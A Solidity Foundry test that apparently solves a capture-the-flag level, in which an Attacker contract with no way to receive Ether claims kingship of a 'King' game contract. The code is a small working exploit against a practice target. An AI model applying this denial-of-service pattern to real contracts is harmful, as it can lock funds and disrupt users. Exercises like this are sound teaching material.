// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./King.sol";

contract Attacker {
    function attack(address king) external payable {
        (bool ok,) = payable(king).call{value: msg.value}("");
        require(ok, "transfer failed");
    }
}

contract KingTest is Test {
    King internal _king;

    function setUp() public {
        _king = new King{value: 0.001e18}();
    }

    receive() external payable {}

    function test_attack() public {
        address user = vm.addr(1);
        deal(user, 1e18);

        vm.startPrank(user, user);

        Attacker attacker = new Attacker();
        attacker.attack{value: _king.prize()}(address(_king));

        vm.stopPrank();

        assertNotEq(_king._king(), address(this), "king");
    }
}